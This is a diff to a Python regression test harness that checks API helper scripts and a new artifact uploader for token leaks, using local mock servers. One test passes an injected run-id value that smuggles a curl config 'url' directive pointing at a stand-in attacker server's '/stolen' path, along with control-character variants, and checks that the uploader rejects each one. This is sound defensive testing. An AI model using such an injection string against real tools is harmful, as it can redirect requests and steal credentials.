@@ -44,6 +44,7 @@ import uuid
 HERE = os.path.dirname(os.path.abspath(__file__))
 SH_HELPER = os.path.join(HERE, "paperclip-api.sh")
 PY_HELPER = os.path.join(HERE, "paperclip-api.py")
+UPLOAD_HELPER = os.path.join(HERE, "paperclip-upload-artifact.sh")
 SENTINEL = "SENTINEL." + uuid.uuid4().hex + ".NOTAREALJWT"
 RUN_ID = "regression-run-id"
 
@@ -59,6 +60,7 @@ class Sink:
         self.sock.listen(8)
         self.port = self.sock.getsockname()[1]
         self.received = b""
+        self.requests = []
         self.connected = threading.Event()
         threading.Thread(target=self._serve, daemon=True).start()
 
@@ -69,6 +71,7 @@ class Sink:
             except OSError:
                 return
             with conn:
+                request_bytes = b""
                 # Keep reading for the whole hold window: a multipart upload
                 # arrives in several segments (curl may also wait out its own
                 # `Expect: 100-continue`), and the body must be seen before the
@@ -85,14 +88,27 @@ class Sink:
                     if not chunk:
                         break
                     self.received += chunk
+                    request_bytes += chunk
                     self.connected.set()
+                self.requests.append(request_bytes)
+                request_line = request_bytes.split(b"\r\n", 1)[0]
+                if b"/attachments " in request_line and request_line.startswith(b"GET "):
+                    body = b"[]"
+                elif b"/attachments " in request_line and request_line.startswith(b"POST "):
+                    body = (b'{"id":"attachment-1","contentPath":"/api/attachments/attachment-1/content",'
+                            b'"downloadPath":"/api/attachments/attachment-1/content?download=1",'
+                            b'"byteSize":18}')
+                else:
+                    body = b"{}"
                 try:
-                    conn.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\n{}')
+                    conn.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: ' + str(len(body)).encode()
+                                 + b'\r\n\r\n' + body)
                 except OSError:
                     pass
 
     def reset(self):
         self.received = b""
+        self.requests = []
         self.connected.clear()
 
     @property
@@ -132,8 +148,14 @@ def run_case(case: dict, sink: Sink, scratch: str) -> dict:
         PAPERCLIP_API_URL=sink.api_url,
         PAPERCLIP_RUN_ID=RUN_ID,
         PAPERCLIP_RUN_SCRATCH_DIR=scratch,
+        PAPERCLIP_HELPER_STATE_DIR=os.path.join(scratch, "uploader-locks"),
+        PAPERCLIP_COMPANY_ID="c",
+        PAPERCLIP_TASK_ID="x",
+        UPLOAD_HELPER=UPLOAD_HELPER,
+        UPLOAD_FILE=os.path.join(scratch, "regression-upload.txt"),
         SINK_URL=sink.api_url + "/agents/me",
     )
+    env["PAPERCLIP_RUN_ID"] = case.get("run_id", RUN_ID)
     proc = subprocess.Popen(["bash", "-c", case["script"]], env=env,
                             stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
     sink.connected.wait(timeout=15)
@@ -143,9 +165,10 @@ def run_case(case: dict, sink: Sink, scratch: str) -> dict:
     got = sink.received.decode("utf-8", "replace")
     leaked = scan["in_proc_cmdline"] or scan["in_ps_output"]
     delivered = ("Bearer " + SENTINEL) in got
-    run_id_ok = ("X-Paperclip-Run-Id: " + RUN_ID) in got if case.get("expect_run_id") else True
+    run_id_ok = ("X-Paperclip-Run-Id: " + env["PAPERCLIP_RUN_ID"]) in got if case.get("expect_run_id") else True
     body_ok = case["expect_body"] in got if case.get("expect_body") else True
-    ok = (leaked == case["expect_leak"]) and delivered and run_id_ok and body_ok
+    request_count_ok = len(sink.requests) == case["expect_request_count"] if case.get("expect_request_count") else True
+    ok = (leaked == case["expect_leak"]) and delivered and run_id_ok and body_ok and request_count_ok
     return {
         "case": case["id"],
         "transport": case["label"],
@@ -154,12 +177,54 @@ def run_case(case: dict, sink: Sink, scratch: str) -> dict:
         "auth_header_delivered": delivered,
         "run_id_header_delivered": run_id_ok,
         "payload_delivered": body_ok,
+        "request_count": len(sink.requests),
         "expected_leak": case["expect_leak"],
         "verdict": ("RED (leak reproduced -- detector control)" if case["expect_leak"] and leaked
                     else "GREEN" if ok else "FAIL"),
         "ok": ok,
         "stderr": (err or "").strip()[:200],
     }
+
+
+def run_rejected_uploader_case(scratch: str, variant: str) -> dict:
+    target = Sink(0.25)
+    attacker = Sink(0.25)
+    try:
+        run_id = {
+            "curl_directive": 'run"\nurl = "' + attacker.api_url + '/stolen',
+            "carriage_return": "run\rid",
+            "line_feed": "run\nid",
+            "tab": "run\tid",
+        }[variant]
+        env = dict(
+            os.environ,
+            PAPERCLIP_API_KEY=SENTINEL,
+            PAPERCLIP_API_URL=target.api_url,
+            PAPERCLIP_RUN_ID=run_id,
+            PAPERCLIP_RUN_SCRATCH_DIR=scratch,
+            PAPERCLIP_HELPER_STATE_DIR=os.path.join(scratch, "uploader-locks"),
+            PAPERCLIP_COMPANY_ID="c",
+            PAPERCLIP_TASK_ID="x",
+        )
+        proc = subprocess.run(
+            ["bash", UPLOAD_HELPER, os.path.join(scratch, "regression-upload.txt"),
+             "--no-work-product", "--output", "json"],
+            env=env, capture_output=True, text=True, timeout=15,
+        )
+        ok = (proc.returncode != 0 and not target.requests and not attacker.requests
+              and not target.connected.is_set() and not attacker.connected.is_set()
+              and "PAPERCLIP_RUN_ID contains a control character" in proc.stderr
+              and SENTINEL not in proc.stderr)
+        return {
+            "case": "uploader_reject_" + variant,
+            "target_requests": len(target.requests),
+            "attacker_requests": len(attacker.requests),
+            "verdict": "GREEN" if ok else "FAIL",
+            "ok": ok,
+        }
+    finally:
+        target.close()
+        attacker.close()
 
 
 def build_cases(scratch: str) -> list:
@@ -215,6 +280,25 @@ def build_cases(scratch: str) -> list:
             "script": 'python3 "%s" GET /api/agents/me' % PY_HELPER,
             "expect_leak": False,
             "expect_run_id": True,
+        },
+        {
+            "id": "G",
+            "label": "artifact uploader with a normal run id",
+            "script": 'bash "$UPLOAD_HELPER" "$UPLOAD_FILE" --no-work-product --output json',
+            "expect_leak": False,
+            "expect_run_id": True,
+            "expect_body": "regression-payload",
+            "expect_request_count": 2,
+        },
+        {
+            "id": "H",
+            "label": "artifact uploader with quote and backslash in run id",
+            "script": 'bash "$UPLOAD_HELPER" "$UPLOAD_FILE" --no-work-product --output json',
+            "run_id": RUN_ID + '"\\quoted',
+            "expect_leak": False,
+            "expect_run_id": True,
+            "expect_body": "regression-payload",
+            "expect_request_count": 2,
         },
     ]
 
@@ -278,6 +362,8 @@ def main() -> int:
     try:
         for case in build_cases(scratch):
             report["cases"].append(run_case(case, sink, scratch))
+        for variant in ("curl_directive", "carriage_return", "line_feed", "tab"):
+            report["cases"].append(run_rejected_uploader_case(scratch, variant))
     finally:
         sink.close()
 
